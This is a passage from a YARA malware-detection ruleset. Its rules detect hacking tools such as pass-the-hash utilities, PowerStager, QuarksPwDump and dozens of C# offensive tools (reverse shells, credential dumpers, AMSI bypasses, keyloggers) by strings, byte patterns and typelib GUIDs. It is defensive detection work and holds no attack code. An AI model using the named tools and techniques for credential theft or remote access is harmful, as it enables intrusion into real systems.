\"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"fbfc8e1bc69348721f06e96ff76ae92f3551f33ed3868808efdb670430ae8bd0\"\n\tstrings:\n\t\t$s0 = \"c:\\\\debug.txt\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */\n\t\t$s1 = \"pth.dll\" fullword ascii /* score: '20.00' */\n\t\t$s2 = \"\\\"Primary\\\" string found at %.8Xh\" fullword ascii /* score: '7.00' */\n\t\t$s3 = \"\\\"Primary\\\" string not found!\" fullword ascii /* score: '6.00' */\n\t\t$s4 = \"segment 1 found at %.8Xh\" fullword ascii /* score: '6.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 4 of them\n}\n\nrule whosthere : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file whosthere.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"d7a82204d3e511cf5af58eabdd6e9757c5dd243f9aca3999dc0e5d1603b1fa37\"\n\tstrings:\n\t\t$s1 = \"by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '48.00' */\n\t\t$s2 = \"whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */\n\t\t$s3 = \"specify addresses to use. Format: ADDCREDENTIAL_ADDR:ENCRYPTMEMORY_ADDR:FEEDBACK_ADDR:DESKEY_ADDR:LOGONSESSIONLIST_ADDR:LOGONSES\" ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */\n\t\t$s4 = \"Could not enable debug privileges. You must run this tool with an account with administrator privileges.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */\n\t\t$s5 = \"-B is now used by default. Trying to find correct addresses..\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */\n\t\t$s6 = \"Cannot get LSASS.EXE PID!\" fullword ascii /* score: '14.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 320KB and 2 of them\n}\n\nrule Powerstager\n{\n    meta:\n      author = \"Jeff White - jwhite@paloaltonetworks.com @noottrak\"\n      date = \"02JAN2018\"\n      hash1 = \"758097319d61e2744fb6b297f0bff957c6aab299278c1f56a90fba197795a0fa\" //x86\n      hash2 = \"83e714e72d9f3c500cad610c4772eae6152a232965191f0125c1c6f97004b7b5\" //x64\n      description = \"Detects PowerStager Windows executable, both x86 and x64\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-powerstager-analysis/\"\n      reference2 = \"https://github.com/z0noxz/powerstager\"\n    \n    strings:\n      $filename = /%s\\\\[a-zA-Z0-9]{12}/\n      $pathname = \"TEMP\" wide ascii\n//    $errormsg = \"The version of this file is not compatible with the version of Windows you're running.\" wide ascii\n      $filedesc = \"Lorem ipsum dolor sit amet, consecteteur adipiscing elit\" wide ascii\n      $apicall_01 = \"memset\"\n      $apicall_02 = \"getenv\"\n      $apicall_03 = \"fopen\"\n      $apicall_04 = \"memcpy\"\n      $apicall_05 = \"fwrite\"\n      $apicall_06 = \"fclose\"\n      $apicall_07 = \"CreateProcessA\"\n      $decoder_x86_01 = { 8D 95 [4] 8B 45 ?? 01 D0 0F B6 18 8B 4D ?? }\n      $decoder_x86_02 = { 89 C8 0F B6 84 05 [4] 31 C3 89 D9 8D 95 [4] 8B 45 ?? 01 D0 88 08 83 45 [2] 8B 45 ?? 3D }\n      $decoder_x64_01 = { 8B 85 [4] 48 98 44 0F [7] 8B 85 [4] 48 63 C8 48 }\n      $decoder_x64_02 = { 48 89 ?? 0F B6 [3-6] 44 89 C2 31 C2 8B 85 [4] 48 98 }\n\n    condition:\n      uint16be(0) == 0x4D5A\n        and\n      all of ($apicall_*)\n        and\n      $filename\n        and\n      $pathname\n        and\n      $filedesc\n        and\n      (2 of ($decoder_x86*) or 2 of ($decoder_x64*))\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule QuarksPwDump_Gen : Toolkit  {\n\tmeta:\n\t\tdescription = \"Detects all QuarksPWDump versions\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-09-29\"\n\t\tscore = 80\n\t\thash1 = \"2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa\"\n\t\thash2 = \"87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f\"\n\t\thash3 = \"a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9\"\n\t\thash4 = \"c5cbb06caa5067fdf916e2f56572435dd40439d8e8554d3354b44f0fd45814ab\"\n\t\thash5 = \"677c06db064ee8d8777a56a641f773266a4d8e0e48fbf0331da696bea16df6aa\"\n\t\thash6 = \"d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674\"\n\t\thash7 = \"8a81b3a75e783765fe4335a2a6d1e126b12e09380edc4da8319efd9288d88819\"\n\tstrings:\n\t\t$s1 = \"OpenProcessToken() error: 0x%08X\" fullword ascii\n\t\t$s2 = \"%d dumped\" fullword ascii\n\t\t$s3 = \"AdjustTokenPrivileges() error: 0x%08X\" fullword ascii\n\t\t$s4 = \"\\\\SAM-%u.dmp\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or\n    organization, as long as you use it under this license.\n*/\n\n\n// These rules have room for false positives if e.g. a dual use tool is contained within a hack tool repo.\n// Could also be done with https://yara.readthedocs.io/en/stable/modules/dotnet.html#c.typelib but that needs an extra module.\n\n\nrule HKTL_NET_GUID_CSharpSetThreadContext {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/CSharpSetThreadContext\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a1e28c8c-b3bd-44de-85b9-8aa7c18a714d\" ascii nocase wide\n        $typelibguid1 = \"87c5970e-0c77-4182-afe2-3fe96f785ebb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DLL_Injection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ihack4falafel/DLL-Injection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3d7e1433-f81a-428a-934f-7cc7fcf1149d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LimeUSB_Csharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/LimeUSB-Csharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"94ea43ab-7878-4048-a64e-2b21b3b4366d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Ladon {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/k8gege/Ladon\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c335405f-5df2-4c7d-9b53-d65adfbed412\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WhiteListEvasion {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/khr0x40sh/WhiteListEvasion\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"858386df-4656-4a1e-94b7-47f6aa555658\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_Downloader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Downloader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ec7afd4c-fbc4-47c1-99aa-6ebb05094173\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DarkEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/K1ngSoul/DarkEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0bdb9c65-14ed-4205-ab0c-ea2151866a7f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpKatz {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpKatz\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8568b4c1-2940-4f6c-bf4e-4383ef268be9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ExternalC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ryhanson/ExternalC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7266acbb-b10d-4873-9b99-12d2043b1d4e\" ascii nocase wide\n        $typelibguid1 = \"5d9515d0-df67-40ed-a6b2-6619620ef0ef\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Povlsomware {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/povlteksttv/Povlsomware\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe0d5aa7-538f-42f6-9ece-b141560f7781\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RunShellcode {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/zerosum0x0/RunShellcode\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a3ec18a3-674c-4131-a7f5-acbed034b819\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpLoginPrompt {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shantanu561993/SharpLoginPrompt\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c12e69cd-78a0-4960-af7e-88cbd794af97\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Adamantium_Thief {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/Adamantium-Thief\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"e6104bc9-fea9-4ee9-b919-28156c1f2ede\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PSByPassCLM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/PSByPassCLM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"46034038-0113-4d75-81fd-eb3b483f2662\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_physmem2profit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/physmem2profit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"814708c9-2320-42d2-a45f-31e42da06a94\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_NoAmci {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/med0x2e/NoAmci\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"352e80ec-72a5-4aa6-aabe-4f9a20393e8e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpBlock {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/CCob/SharpBlock\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3cf25e04-27e4-4d19-945e-dadc37c81152\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_nopowershell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/bitsadmin/nopowershell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"555ad0ac-1fdb-4016-8257-170a74cb2f55\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LimeLogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/LimeLogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"068d14ef-f0a1-4f9d-8e27-58b4317830c6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AggressorScripts {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/harleyQu1nn/AggressorScripts\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"afd1ff09-2632-4087-a30c-43591f32e4e8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Gopher {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/EncodeGroup/Gopher\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"b5152683-2514-49ce-9aca-1bc43df1e234\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AVIator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Ch0pin/AVIator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4885a4a3-4dfa-486c-b378-ae94a221661a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_njCrypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xPh0enix/njCrypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8a87b003-4b43-467b-a509-0c8be05bf5a5\" ascii nocase wide\n        $typelibguid1 = \"80b13bff-24a5-4193-8e51-c62a414060ec\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpMiniDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpMiniDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6ffccf81-6c3c-4d3f-b15f-35a86d0b497f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CinaRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/wearelegal/CinaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8586f5b1-2ef4-4f35-bd45-c6206fdc0ebc\" ascii nocase wide\n        $typelibguid1 = \"fe184ab5-f153-4179-9bf5-50523987cf1f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ToxicEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/ToxicEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1bcfe538-14f4-4beb-9a3f-3f9472794902\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Disable_Windows_Defender {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Disable-Windows-Defender\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"501e3fdc-575d-492e-90bc-703fb6280ee2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DInvoke_PoC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/dtrizna/DInvoke_PoC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5a869ab2-291a-49e6-a1b7-0d0f051bef0e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ReverseShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/chango77747/ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"980109e4-c988-47f9-b2b3-88d63fababdc\" ascii nocase wide\n        $typelibguid1 = \"8abe8da1-457e-4933-a40d-0958c8925985\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SharpC2/SharpC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"62b9ee4f-1436-4098-9bc1-dd61b42d8b81\" ascii nocase wide\n        $typelibguid1 = \"d2f17a91-eb2d-4373-90bf-a26e46c68f76\" ascii nocase wide\n        $typelibguid2 = \"a9db9fcc-7502-42cd-81ec-3cd66f511346\" ascii nocase wide\n        $typelibguid3 = \"ca6cc2ee-75fd-4f00-b687-917fa55a4fae\" ascii nocase wide\n        $typelibguid4 = \"a1167b68-446b-4c0c-a8b8-2a7278b67511\" ascii nocase wide\n        $typelibguid5 = \"4d8c2a88-1da5-4abe-8995-6606473d7cf1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SneakyExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HackingThings/SneakyExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"612590aa-af68-41e6-8ce2-e831f7fe4ccc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UrbanBishopLocal {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/UrbanBishopLocal\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"88b8515e-a0e8-4208-a9a0-34b01d7ba533\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cobbr/SharpShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"bdba47c5-e823-4404-91d0-7f6561279525\" ascii nocase wide\n        $typelibguid1 = \"b84548dc-d926-4b39-8293-fa0bdef34d49\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EvilWMIProvider {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/sunnyc7/EvilWMIProvider\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a4020626-f1ec-4012-8b17-a2c8a0204a4b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_GadgetToJScript {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/med0x2e/GadgetToJScript\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"af9c62a1-f8d2-4be0-b019-0a7873e81ea9\" ascii nocase wide\n        $typelibguid1 = \"b2b3adb0-1669-4b94-86cb-6dd682ddbea3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AzureCLI_Extractor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0x09AL/AzureCLI-Extractor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a73cad74-f8d6-43e6-9a4c-b87832cdeace\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UAC_Escaper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/UAC-Escaper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"95359279-5cfa-46f6-b400-e80542a7336a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HTTPSBeaconShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/limbenjamin/HTTPSBeaconShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"aca853dc-9e74-4175-8170-e85372d5f2a9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AmsiScanBufferBypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/AmsiScanBufferBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"431ef2d9-5cca-41d3-87ba-c7f5e4582dd2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ShellcodeLoader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Hzllaga/ShellcodeLoader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a48fe0e1-30de-46a6-985a-3f2de3c8ac96\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_KeystrokeAPI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fabriciorissetto/KeystrokeAPI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f6fec17e-e22d-4149-a8a8-9f64c3c905d3\" ascii nocase wide\n        $typelibguid1 = \"b7aa4e23-39a4-49d5-859a-083c789bfea2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ShellCodeRunner {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/antman1p/ShellCodeRunner\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"634874b7-bf85-400c-82f0-7f3b4659549a\" ascii nocase wide\n        $typelibguid1 = \"2f9c3053-077f-45f2-b207-87c3c7b8f054\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_OffensiveCSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/diljith369/OffensiveCSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6c3fbc65-b673-40f0-b1ac-20636df01a85\" ascii nocase wide\n        $typelibguid1 = \"2bad9d69-ada9-4f1e-b838-9567e1503e93\" ascii nocase wide\n        $typelibguid2 = \"512015de-a70f-4887-8eae-e500fd2898ab\" ascii nocase wide\n        $typelibguid3 = \"1ee4188c-24ac-4478-b892-36b1029a13b3\" ascii nocase wide\n        $typelibguid4 = \"5c6b7361-f9ab-41dc-bfa0-ed5d4b0032a8\" ascii nocase wide\n        $typelibguid5 = \"048a6559-d4d3-4ad8-af0f-b7f72b212e90\" ascii nocase wide\n        $typelibguid6 = \"3412fbe9-19d3-41d8-9ad2-6461fcb394dc\" ascii nocase wide\n        $typelibguid7 = \"9ea4e0dc-9723-4d93-85bb-a4fcab0ad210\" ascii nocase wide\n        $typelibguid8 = \"6d2b239c-ba1e-43ec-8334-d67d52b77181\" ascii nocase wide\n        $typelibguid9 = \"42e8b9e1-0cf4-46ae-b573-9d0563e41238\" ascii nocase wide\n        $typelibguid10 = \"0d15e0e3-bcfd-4a85-adcd-0e751dab4dd6\" ascii nocase wide\n        $typelibguid11 = \"644dfd1a-fda5-4948-83c2-8d3b5eda143a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SHAPESHIFTER {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/matterpreter/SHAPESHIFTER\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a3ddfcaa-66e7-44fd-ad48-9d80d1651228\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Evasor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cyberark/Evasor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1c8849ef-ad09-4727-bf81-1f777bd1aef8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Stracciatella {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mgeeky/Stracciatella\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"eaafa0ac-e464-4fc4-9713-48aa9a6716fb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_logger {\n    meta:\n        description = \"Detects c# 